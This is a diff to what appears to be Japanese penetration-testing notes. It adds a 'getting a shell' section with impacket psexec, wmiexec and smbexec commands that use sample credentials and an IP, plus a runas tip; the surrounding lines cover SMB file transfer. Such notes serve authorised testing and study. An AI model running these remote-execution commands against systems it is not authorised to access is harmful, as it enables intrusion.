@@ -47,6 +47,24 @@ $ python /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -use
 copy <file> \\<ip>\public\
 ```
 
+### シェル取得
+
+管理者権限が必要
+
+```sh
+psexec.py privesc/notadmin:'P@ssw0rd!'@10.144.151.14
+
+wmiexec.py privesc/notadmin:'P@ssw0rd!'@10.144.151.14
+
+smbexec.py privesc/notadmin:'P@ssw0rd!'@10.144.151.14
+```
+
+（他のユーザーでRDP等に接続できているなら runas がある）
+
+```sh
+runas /user:<user> cmd.exe
+```
+
 ### パスワードハッシュ抽出
 
 ```sh
